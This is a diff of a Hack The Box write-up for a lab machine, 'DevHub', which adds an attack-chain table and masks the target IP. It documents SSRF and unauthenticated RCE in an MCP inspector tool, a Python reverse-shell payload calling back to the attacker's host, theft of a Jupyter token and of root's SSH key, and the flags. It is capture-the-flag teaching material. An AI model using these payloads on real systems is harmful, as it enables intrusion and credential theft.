@@ -10,7 +10,28 @@ machine no.: 2
 ---
 ## Attack Chain Summary
 
-
+| #   | 🟢 Simple Version                                                                                                                                                                                                                                                                     | 🔴 Technical Detail                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
+| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 1   | **We connect to the lab.** Download a VPN config file from Hack The Box and run it to join the private network where the target machine lives.                                                                                                                                        | `sudo openvpn your_file.ovpn` — establishes an encrypted tunnel to the HTB network. Assigns a `tun0` interface with a `10.10.14.x` address on the attacker machine.                                                                                                                                                                                                                                                                                                                               |
+| 2   | **We check the target is alive.** Send a few ping packets to confirm the machine is actually on and responding before we waste time scanning it.                                                                                                                                      | `ping -c 4 10.129.245.216` — ICMP echo request. TTL of 63 indicates one hop behind a router (common in HTB). 0% packet loss confirms the host is up.                                                                                                                                                                                                                                                                                                                                              |
+| 3   | **We scan for open doors (ports).** We use a tool called Nmap to check all 65,535 possible "doors" on the target machine quickly. Three are open: 22, 80, and 6274.                                                                                                                   | `nmap -p- --min-rate 5000 -Pn 10.129.245.216` — full TCP port sweep at 5,000 pps. `-Pn` skips ICMP host discovery. Discovers ports 22 (SSH), 80 (HTTP), 6274 (unknown).                                                                                                                                                                                                                                                                                                                           |
+| 4   | **We get more details on those three doors.** We run a deeper scan to fingerprint exactly what software is running behind each open port.                                                                                                                                             | `nmap -A -p 22,80,6274` — aggressive scan enabling OS detection, version detection (`-sV`), and default scripts (`-sC`). Identifies: OpenSSH 8.9p1, nginx 1.18.0 redirecting to `devhub.htb`, and a Node.js app serving an HTML page titled "MCPJam Inspector" on 6274.                                                                                                                                                                                                                           |
+| 5   | **We tell our machine how to find the website.** The website uses a name (`devhub.htb`) instead of an IP, so we add a manual entry to our local "phone book" so our browser can reach it.                                                                                             | Add `10.129.245.216 devhub.htb` to `/etc/hosts`. This overrides DNS lookup — the OS checks `/etc/hosts` before querying any DNS server, so `devhub.htb` resolves locally without a real DNS record existing.                                                                                                                                                                                                                                                                                      |
+| 6   | **We browse the website.** The homepage is an internal dev platform landing page. It openly lists three internal services, including one that's publicly accessible and one that's supposedly only reachable from inside the server.                                                  | `http://devhub.htb` — nginx vhost serves a static page advertising: MCP Inspector (active, port 6274), Jupyter Analytics Dashboard (internal only, `localhost:8888`), and a Git Code Repository (maintenance mode). Tech stack disclosed: Node.js, Python 3, Jupyter, Ubuntu 24.04. Classic information disclosure.                                                                                                                                                                               |
+| 7   | **We dig into the publicly accessible tool (MCPJam).** We navigate to port 6274 and find a developer debugging tool for something called MCP (Model Context Protocol) — a way for AI assistants to use external tools. It has no login.                                               | `http://10.129.245.216:6274` — MCPJam Inspector v1.4.2 is exposed publicly with zero authentication. Designed as a localhost developer utility. The Node.js backend proxies connections to MCP servers on behalf of the React frontend.                                                                                                                                                                                                                                                           |
+| 8   | **We extract the app's hidden API endpoints.** Since the website's entire code is shipped to the browser as one JavaScript file, we download that file and grep it for URL paths — finding a list of every backend endpoint, including dangerous ones.                                | `curl -s http://10.129.245.216:6274/assets/index-DRYhT9Xb.js \| grep -Eo '"/[a-zA-Z0-9/_-]+"' \| sort -u` — extracts all quoted path strings from the minified bundle. SPAs must ship endpoint URLs as string literals; they cannot be hidden. Key finds: `/api/mcp/oauth/proxy` (SSRF vector) and `/api/mcp/connect` (RCE vector via stdio transport).                                                                                                                                           |
+| 9   | **We use the proxy endpoint as a telescope into the server's internal network.** The OAuth proxy is meant to forward OAuth requests to external services, but there's no restriction on what URL we give it. We point it at the internal Jupyter server.                              | `POST /api/mcp/oauth/proxy` with `{"url":"http://127.0.0.1:8888/api"}` — the server fetches the URL server-side and returns the response. No allowlist validation. Response: `{"version":"2.17.0"}` with `Server: TornadoServer/6.5.4`. SSRF confirmed — we can reach any `127.0.0.1` service the target can reach.                                                                                                                                                                               |
+| 10  | **We discover a second hidden internal service.** We probe port 5000 the same way and find a custom Flask API called OPSMCP. It tells us it requires an API key and lists its endpoints — though not all of them, as we'll find out.                                                  | `POST /api/mcp/oauth/proxy` with `{"url":"http://127.0.0.1:5000/"}` — response reveals OPSMCP 2.1.0 running on Werkzeug/Flask, with endpoints `/tools/list`, `/tools/call`, `/health`, and an `X-API-Key` auth requirement. Running as root (confirmed later via `ps`).                                                                                                                                                                                                                           |
+| 11  | **We get a shell on the server.** The MCPJam connect endpoint is supposed to launch an MCP server process. Instead, we give it a Python reverse shell as the "command." The server runs it, and our listener catches the connection.                                                  | `POST /api/mcp/connect` with `{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.85\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"]}}` — the `stdio` transport calls `child_process.spawn()` with attacker-controlled `command`/`args` directly, no validation. Reverse shell connects back to `nc -lvnp 4444`. Shell lands as `mcp-dev`. |
+| 12  | **We lock in stable access via SSH so we don't rely on the fragile shell.** We generate an SSH key pair on our machine, add the public key to the target user's `authorized_keys`, and SSH in properly.                                                                               | `ssh-keygen -t ed25519 -f /tmp/devhub_key -N ""` on Kali. Then via rev shell: `mkdir -p ~/.ssh`, `echo '<pubkey>' >> ~/.ssh/authorized_keys`, `chmod 700 ~/.ssh`, `chmod 600 ~/.ssh/authorized_keys`. Connect with `ssh -i /tmp/devhub_key mcp-dev@10.129.245.216`. Reverse shell discarded.                                                                                                                                                                                                      |
+| 13  | **We list all running processes and find a password in plain sight.** On Linux, every process's full command line — including any passwords or tokens passed as arguments — is visible to all users. The Jupyter process is running with its auth token typed right into the command. | `ps auxww` — the `ww` flag removes line-width truncation, revealing the full command line. Analyst's Jupyter process contains `--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`. Token is stored in world-readable `/proc/<pid>/cmdline`. Also reveals OPSMCP (`/opt/opsmcp/server.py`) running as root (PID 1061).                                                                                                                                                                    |
+| 14  | **We confirm we can't just browse the analyst's files directly.** The analyst's home folder is locked down to their own user. We need to find another way in — which is why the Jupyter token matters.                                                                                | `ls -la /home/analyst/` → `Permission denied`. Directory permissions are `drwxr-x---` owned by `analyst:analyst`. `mcp-dev` is not in the `analyst` group and is not the owner, so the `---` (others) permission applies — no read, write, or execute access.                                                                                                                                                                                                                                     |
+| 15  | **We tunnel the internal services to our own machine.** Rather than routing everything through our SSRF proxy, we create SSH tunnels that make the internal Jupyter and OPSMCP services appear as local ports on our Kali machine.                                                    | `ssh -i /tmp/devhub_key -L 18888:127.0.0.1:8888 -L 15000:127.0.0.1:5000 mcp-dev@10.129.245.216 -fN` — `-L local:remote:port` binds a local port; traffic is forwarded over the encrypted SSH connection and delivered from the target's localhost. `-fN` forks to background without a remote command. Verified with `curl localhost:18888/api` and `curl localhost:15000/health`.                                                                                                                |
+| 16  | **We authenticate to Jupyter using the stolen token and create a Python process.** Jupyter's API doesn't run code directly — first you create a "kernel," which is a Python interpreter process running as the `analyst` user.                                                        | `POST http://localhost:18888/api/kernels` with `Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` and body `{"name":"python3"}`. Returns a kernel ID (`43e96841-...`). The kernel process spawns as `analyst` — the user who launched Jupyter.                                                                                                                                                                                                                                       |
+| 17  | **We connect to that Python process and run code as the analyst user.** Jupyter uses a WebSocket (not a regular HTTP request) to actually send and receive code. We write a small script to speak that protocol and execute Python commands as `analyst`.                             | `jupyter_exec.py` — opens a WebSocket to `ws://localhost:18888/api/kernels/{id}/channels` with the token header. Sends a `execute_request` message (Jupyter Messaging Protocol v5.3) with the code payload. Receives `stream` output messages. Code reads `/home/analyst/user.txt` and `/opt/opsmcp/server.py`. Executes as `uid=1002(analyst)`.                                                                                                                                                  |
+| 18  | **We get the first flag and, more importantly, the full source code of OPSMCP.** Reading the source reveals the hardcoded API key, and — hidden from the public API listing — a secret tool that reads root's private SSH key from disk.                                              | `user.txt` → `21aae6fc453576f22fd0faa797880a9a`. OPSMCP source reveals: `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"`. Hidden tool `ops._admin_dump` (not in `/tools/list`, only in `ALL_TOOLS`) has a `target: "ssh_keys"` branch that does `open('/root/.ssh/id_rsa', 'r')` and returns the content. Since OPSMCP runs as root, this read succeeds.                                                                                                                                    |
+| 19  | **We call that secret tool using the stolen API key.** OPSMCP is running as root and has a backdoor that hands out root's private SSH key. We call it directly through our tunnel.                                                                                                    | `POST http://localhost:15000/tools/call` with `X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a` and body `{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}`. OPSMCP (running as root) opens `/root/.ssh/id_rsa`, reads it, and returns it in the JSON response.                                                                                                                                                                                                          |
+| 20  | **We clean up the key and log in as root.** The private key comes back as a JSON string with escaped newlines. We parse it properly into a real key file, set the right permissions, and SSH directly in as root.                                                                     | `curl ... \| python3 -c "import json,sys; print(json.load(sys.stdin)['root_private_key'])" > /tmp/root_id_rsa` — `json.load()` converts `\n` escape sequences into real newlines. `chmod 600 /tmp/root_id_rsa`. Then `ssh -i /tmp/root_id_rsa root@10.129.245.216`. Root shell obtained. `cat /root/root.txt` → `7418a44bc58001359c3601056dc530fe`.                                                                                                                                               |
 <div align="center">
 <br>
 <br>
@@ -51,14 +72,14 @@ Verify that the target machine is up and reachable by performing an ICMP ping te
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
-└─$ ping -c 4 10.129.245.216
-PING 10.129.245.216 (10.129.245.216) 56(84) bytes of data.
-64 bytes from 10.129.245.216: icmp_seq=1 ttl=63 time=214 ms
-64 bytes from 10.129.245.216: icmp_seq=2 ttl=63 time=207 ms
-64 bytes from 10.129.245.216: icmp_seq=3 ttl=63 time=211 ms
-64 bytes from 10.129.245.216: icmp_seq=4 ttl=63 time=206 ms
+└─$ ping -c 4 TARGET_IP
+PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
+64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=214 ms
+64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=207 ms
+64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=211 ms
+64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=206 ms
 
---- 10.129.245.216 ping statistics ---
+--- TARGET_IP ping statistics ---
 4 packets transmitted, 4 received, 0% packet loss, time 3004ms
 rtt min/avg/max/mdev = 206.041/209.497/213.890/3.075 ms
 ```
@@ -104,9 +125,9 @@ Before we can attack a system, we need to find out what "doors" are open. Doors 
 
 ```shell
 ┌──(kali㉿kali)-[~]
-└─$ nmap -p- --min-rate 5000 -Pn 10.129.245.216
+└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 10:51 -0400
-Nmap scan report for 10.129.245.216
+Nmap scan report for TARGET_IP
 Host is up (0.32s latency).
 Not shown: 65532 filtered tcp ports (no-response)
 PORT     STATE SERVICE
@@ -137,9 +158,9 @@ PORT     STATE SERVICE
 
 ```shell
 ┌──(kali㉿kali)-[~]
-└─$ nmap -A -p 22,80,6274 10.129.245.216       
+└─$ nmap -A -p 22,80,6274 TARGET_IP       
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 10:55 -0400
-Nmap scan report for 10.129.245.216
+Nmap scan report for TARGET_IP
 Host is up (0.22s latency).
 
 PORT     STATE SERVICE VERSION
@@ -228,7 +249,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE (using port 80/tcp)
 HOP RTT       ADDRESS
 1   223.63 ms 10.10.14.1
-2   223.76 ms 10.129.245.216
+2   223.76 ms TARGET_IP
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 42.30 seconds
@@ -283,8 +304,8 @@ The relationship:
 
 A subdomain is how you reach a virtual host. A virtual host is what handles the request when you arrive.
 
-admin.devhub.htb  →  DNS resolves to 10.129.245.216  →  nginx vhost config for admin.devhub.htb  →  serves admin panel
-devhub.htb        →  DNS resolves to 10.129.245.216  →  nginx vhost config for devhub.htb        →  serves main page
+admin.devhub.htb  →  DNS resolves to TARGET_IP  →  nginx vhost config for admin.devhub.htb  →  serves admin panel
+devhub.htb        →  DNS resolves to TARGET_IP  →  nginx vhost config for devhub.htb        →  serves main page
 
 Same IP, same server, two subdomains, two virtual hosts.
 
@@ -423,7 +444,7 @@ The application appears intentionally minimal:
 
 #### 2.2.3 MCPJam
 
-During our nmap service scan we found port `6274` open with an unknown service. The fingerprint response contained an HTML title — `MCPJam Inspector` — which immediately told us what was running. Navigating to http://10.129.245.216:6274 in the browser confirms it, presenting a single-page application (SPA): a clean React interface with connection controls, a tool list panel, and an execution console.
+During our nmap service scan we found port `6274` open with an unknown service. The fingerprint response contained an HTML title — `MCPJam Inspector` — which immediately told us what was running. Navigating to http://TARGET_IP:6274 in the browser confirms it, presenting a single-page application (SPA): a clean React interface with connection controls, a tool list panel, and an execution console.
 
 ![[Pasted image 20260610000713.png]]
 <div align="center">
@@ -485,7 +506,7 @@ So the process is:
 
 ```shell
 ┌──(kali㉿kali)-[~]
-└─$ curl -s http://10.129.245.216:6274/                       
+└─$ curl -s http://TARGET_IP:6274/                       
 <!doctype html>
 <html lang="en">
   <head>
@@ -522,7 +543,7 @@ This fetches the actual JavaScript bundle file using the filename you just found
 
 ```shell
 ┌──(kali㉿kali)-[~]
-└─$ curl -s http://10.129.245.216:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u
+└─$ curl -s http://TARGET_IP:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u
 "//"
 "/api/apps/chatgpt/widget/store"
 "/api/chat"
@@ -619,7 +640,7 @@ From the port 80 dashboard the page told us:
 **Result:**
 
 ```shell
-kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
+kali@kali:~$ curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" \
   -H "Content-Type: application/json" \
   -d '{"url":"http://127.0.0.1:8888/api"}'
 {"status":200,"statusText":"OK","headers":{"server":"TornadoServer/6.5.4","content-type":"application/json"},"body":{"version":"2.17.0"}}
@@ -664,7 +685,7 @@ Three things this confirms:
 | version: 2.17.0     | That's Jupyter's API responding                                     |
 | TornadoServer/6.5.4 | The web framework Jupyter runs on — fingerprints the exact software |
 
-If you had tried this from your own Kali machine directly: `curl http://10.129.245.216:8888/api`
+If you had tried this from your own Kali machine directly: `curl http://TARGET_IP:8888/api`
 You'd get nothing — port 8888 isn't exposed externally. But the MCPJam server reached it because it's on the same machine. You used MCPJam as a proxy to see inside the server's internal network.
 
 That's the SSRF. You can now reach anything on localhost that you couldn't touch before.
@@ -682,7 +703,7 @@ That's the SSRF. You can now reach anything on localhost that you couldn't touch
 
 ```shell
 ┌──(kali㉿kali)-[~]
-└─$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'   
+└─$ curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'   
 {"status":200,"statusText":"OK","headers":{"connection":"close","content-length":"150","content-type":"application/json","date":"Tue, 09 Jun 2026 21:57:30 GMT","server":"Werkzeug/3.1.6 Python/3.10.12"},"body":{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}} 
 ```
 
@@ -697,12 +718,12 @@ That's the SSRF. You can now reach anything on localhost that you couldn't touch
 
 ### 2.3 Vulnerability Research & Analysis
 
-| Service | Version | Vulnerability Class | Notes |
-|---------|---------|--------------------|----|
-| MCPJam Inspector `/api/mcp/oauth/proxy` | 1.4.2 | SSRF (no allowlist) | Full internal network access via proxied HTTP requests |
-| MCPJam Inspector `/api/mcp/connect` | 1.4.2 | Unauthenticated RCE via stdio transport | Spawns arbitrary OS processes as the service user |
-| Jupyter Lab | 2.17.0 | Token exposed in `ps aux` (process argument) | Tokens visible to all users with process listing rights |
-| OPSMCP | 2.1.0 | Hidden tool with no secondary authorization | `ops._admin_dump` not in `/tools/list` but callable; reads `/root/.ssh/id_rsa` |
+| Service                                 | Version | Vulnerability Class                          | Notes                                                                          |
+| --------------------------------------- | ------- | -------------------------------------------- | ------------------------------------------------------------------------------ |
+| MCPJam Inspector `/api/mcp/oauth/proxy` | 1.4.2   | SSRF (no allowlist)                          | Full internal network access via proxied HTTP requests                         |
+| MCPJam Inspector `/api/mcp/connect`     | 1.4.2   | Unauthenticated RCE via stdio transport      | Spawns arbitrary OS processes as the service user                              |
+| Jupyter Lab                             | 2.17.0  | Token exposed in `ps aux` (process argument) | Tokens visible to all users with process listing rights                        |
+| OPSMCP                                  | 2.1.0   | Hidden tool with no secondary authorization  | `ops._admin_dump` not in `/tools/list` but callable; reads `/root/.ssh/id_rsa` |
 
 The stdio transport vulnerability in `/api/mcp/connect` is the most critical — MCP stdio transport works by spawning a child process and communicating with it over stdin/stdout using JSON-RPC. The Inspector accepts a `serverConfig` object with a `command` and `args` array, passing them directly to `child_process.spawn()` without any validation. Sending a Python reverse shell as the `command`/`args` results in immediate code execution as the `mcp-dev` service account.
 <div align="center">
@@ -778,7 +799,7 @@ listening on [any] 4444 ...
 **Command:**
 
 ```
-curl -s -X POST http://10.129.245.216:6274/api/mcp/connect \
+curl -s -X POST http://TARGET_IP:6274/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.85\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"]},"serverId":"revshell"}'
 ```
@@ -796,7 +817,7 @@ curl -s -X POST http://10.129.245.216:6274/api/mcp/connect \
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
-connect to [10.10.14.85] from (UNKNOWN) [10.129.245.216] 38030
+connect to [10.10.14.85] from (UNKNOWN) [TARGET_IP] 38030
 bash: cannot set terminal process group (1078): Inappropriate ioctl for device
 bash: no job control in this shell
 mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
@@ -976,7 +997,7 @@ If either the directory (700) or the file (600) has looser permissions, SSH will
 
 From Kali:
 
-`ssh -i /tmp/devhub_key mcp-dev@10.129.245.216`
+`ssh -i /tmp/devhub_key mcp-dev@TARGET_IP`
 
 **Breakdown:**
 
@@ -986,9 +1007,9 @@ From Kali:
 - `-i /tmp/devhub_key`
   - Description: "Identity file" flag — tells SSH which private key to use for authentication.
   - Purpose: SSH needs to prove our identity using the private key that matches the public key we placed in authorized_keys on the target. Without `-i`, SSH would try its default keys (`~/.ssh/id_rsa`, etc.) and fail, falling back to password auth — which we don't have.
-- `mcp-dev@10.129.245.216`
+- `mcp-dev@TARGET_IP`
   - Description: `user@host` syntax — specifies which user account to log in as, and which machine to connect to.
-  - Purpose: `mcp-dev` is the account whose authorized_keys we modified via the reverse shell, and `10.129.245.216` is the DevHub target IP.
+  - Purpose: `mcp-dev` is the account whose authorized_keys we modified via the reverse shell, and `TARGET_IP` is the DevHub target IP.
 
 If that drops you into a clean shell as mcp-dev, you have stable persistent access and can let the reverse shell go.
 
@@ -996,7 +1017,7 @@ If that drops you into a clean shell as mcp-dev, you have stable persistent acce
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
-└─$ ssh -i /tmp/devhub_key mcp-dev@10.129.245.216 
+└─$ ssh -i /tmp/devhub_key mcp-dev@TARGET_IP 
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -1011,7 +1032,7 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
   Swap usage:            0%
   Processes:             224
   Users logged in:       0
-  IPv4 address for eth0: 10.129.245.216
+  IPv4 address for eth0: TARGET_IP
   IPv6 address for eth0: dead:beef::a0de:adff:fee0:5010
 
 
@@ -1356,7 +1377,7 @@ Both services are bound to `127.0.0.1` on the target — meaning they only accep
 
 Run this on your Kali machine (new terminal, separate from your existing SSH session):
 
-**Command:** `ssh -i /tmp/devhub_key -L 18888:127.0.0.1:8888 -L 15000:127.0.0.1:5000 mcp-dev@10.129.245.216 -fN`
+**Command:** `ssh -i /tmp/devhub_key -L 18888:127.0.0.1:8888 -L 15000:127.0.0.1:5000 mcp-dev@TARGET_IP -fN`
 
 **Breakdown:**
 
@@ -2016,7 +2037,7 @@ The key file is now correctly formatted — proper headers, footers, and multi-l
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
-└─$ ssh -i /tmp/root_id_rsa -o StrictHostKeyChecking=no root@10.129.245.216
+└─$ ssh -i /tmp/root_id_rsa -o StrictHostKeyChecking=no root@TARGET_IP
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -2031,7 +2052,7 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
   Swap usage:            0%
   Processes:             235
   Users logged in:       1
-  IPv4 address for eth0: 10.129.245.216
+  IPv4 address for eth0: TARGET_IP
   IPv6 address for eth0: dead:beef::a0de:adff:fee0:5010
 
   => There is 1 zombie process.
